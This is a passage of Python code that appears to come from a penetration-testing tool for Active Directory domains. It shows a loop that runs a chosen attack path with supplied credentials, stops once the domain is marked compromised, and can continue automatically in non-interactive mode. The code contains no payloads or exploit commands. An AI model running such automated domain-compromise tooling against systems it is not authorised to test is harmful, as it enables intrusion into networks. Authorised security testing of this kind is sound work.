        # updating step status due to a vendor bug), the path can never
        # be re-selected by default in the same session. Belt-and-
        # suspenders alongside the post-execution markers added by
        # the refusal branches above — see ``_record_attempt`` and
        # ``attack_path_session_signature`` for the full rationale.
        _record_attempt(selected_idx)
        executed = execute_selected_attack_path(
            shell,
            domain,
            summary=selected,
            context_username=context_username,
            context_password=context_password,
            search_mode_label=selected_search_mode_label,
        )
        if executed:
            if not was_pwned_at_start and _domain_now_pwned():
                print_info_debug(
                    "[attack_paths] stopping after compromise: "
                    f"domain={marked_domain} auth transitioned to pwned"
                )
                return True
            if single_pass:
                return True
            affected_count = _affected_user_count(selected)
            if (
                recompute_summaries is not None
                and _AUTO_REFRESH_AFFECTED_USERS_THRESHOLD > 0
                and affected_count >= _AUTO_REFRESH_AFFECTED_USERS_THRESHOLD
            ):
                print_info(
                    "Execution completed. Skipping automatic attack-path refresh "
                    f"(affected principals={affected_count}, threshold={_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD}). "
                    "All attack steps are already persisted; only the live list refresh is deferred. "
                    "Run `attack_paths <domain> owned` when you want a fresh recomputation."
                )
                print_info_debug(
                    "[attack_paths] auto-refresh skipped after execution: "
                    f"domain={marked_domain} affected_users={affected_count} "
                    f"threshold={_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD}"
                )
                return True
            print_info_verbose(
                "Refreshing attack-path summaries after execution "
                "(this can take longer on large domains)."
            )
            # _refresh_summaries already returns canonical UX order via
            # order_attack_paths_for_display, so no secondary regroup is
            # needed even when show_sections=True.
            summaries = _refresh_summaries()
            # Indices in _tried_idx_set were relative to the previous
            # summaries list. After a refresh the ordering may have changed
            # (e.g., a step transitioning to ``success`` reranks paths), so
            # the set is no longer meaningful — start fresh.
            _tried_idx_set.clear()
            persist_attack_path_snapshot(
                shell,
                domain,
                summaries=summaries,
                scope=snapshot_scope,
                target=snapshot_target,
                target_mode=snapshot_target_mode,
                search_mode_label=search_mode_label,
            )
            # Auto-continue convergence: stop the non-interactive loop
            # when there is nothing meaningful left to try. "Meaningful"
            # combines two signals:
            #
            # 1. The path is still ``theoretical`` AND admitted by the
            #    status filter (legacy criterion — handles the happy
            #    path where execution flips paths to exploited/attempted).
            # 2. The path has NOT already been attempted in this session
            #    (new criterion — handles the failure modes the
            #    ``_attempted_signatures`` guardrail was built for:
            #    primitives that succeed but fail to update step status,
            #    primitives that crash mid-flight, recompute callbacks
            #    that return the same stale view, etc.).
            #
            # Without (2), a non-interactive caller that does not pass
            # ``recompute_summaries`` (or whose recompute is a no-op for
            # this test) loops forever because the path keeps reading
            # ``theoretical`` even after the auto-confirmed execution.
            # Combining both signals means convergence is reached when
            # either every theoretical path made progress OR every
            # theoretical path has already had its turn — whichever
            # happens first.
            if (
                non_interactive
                and auto_continue_theoretical_in_non_interactive
                and not any(
                    _is_theoretical_status(summary.get("status"))
                    and _status_allowed_by_filter(
                        str(summary.get("status") or "theoretical").strip().lower(),
                        desired_statuses_set,
                    )
                    and not _path_was_attempted_this_session(summary)
                    for summary in summaries
                )
            ):
                print_info_debug(
                    "[attack_paths] auto-continue converged: "
                    f"domain={marked_domain} no untried theoretical "
                    "summaries remain"
                )
                return True
            actionable_paths = [
                summary
                for summary in summaries
                if _path_is_actionable_for_execution_prompt(
                    summary, desired_statuses=desired_statuses_set
                )
            ]
            if actionable_paths:
                print_info_debug(
                    "[attack_paths] re-prompting after execution: "
                    f"domain={marked_domain} remaining={len(summaries)} actionable={len(actionable_paths)}"
                )
                print_attack_paths_summary(
                    domain,
                    summaries,
                    max_display=min(max_display, len(summaries)),
                    search_mode_label=search_mode_label,
                    actionable_count=len(actionable_paths),
                    show_sections=show_sections,
                )
                continue
            if summaries:
                non_actionable_total, reasons = _summarize_non_actionable_paths(
                    summaries,
                    desired_statuses=desired_statuses_set,
                )
                reason_summary = _format_non_actionable_reason_summary(reasons)
                if (
                    reasons["exploited"] == non_actionable_total
                    and non_actionable_total > 0
                ):
                    print_info(
                        "Execution completed. No further actionable attack paths remain "
                        "because the remaining paths are already exploited."
                    )
                else:
                    print_info(
                        "Execution completed. No further actionable attack paths remain. "
                        "Any remaining paths are already exploited, blocked, unsupported, "
                        "or missing execution context."
                    )
                print_info(f"Remaining path summary: {reason_summary}")
                print_info_debug(
                    "[attack_paths] stopping after execution: "
                    f"domain={marked_domain} reason=no_actionable_paths "
                    f"remaining={non_actionable_total} exploited={reasons['exploited']} "
                    f"blocked={reasons['blocked']} unsupported={reasons['unsupported']} "
                    f"unavailable={reasons['unavailable']} needs_context={reasons['needs_context']} "
                    f"filtered={reasons['status_filtered']} other={reasons['other']}"
                )
                return True
            print_info_debug(
                f"[attack_paths] stopping after execution: domain={marked_domain} reason=no_remaining_paths"
            )
            return True

        # `execute_selected_attack_path` already printed a user-facing error/warning.
        # Keep the selection loop open so the user can try another path.
        print_info_debug(
            f"[attack_paths] re-prompting after failed attempt: domain={marked_domain}"
        )
        if single_pass:
            return executed
        continue

    return executed
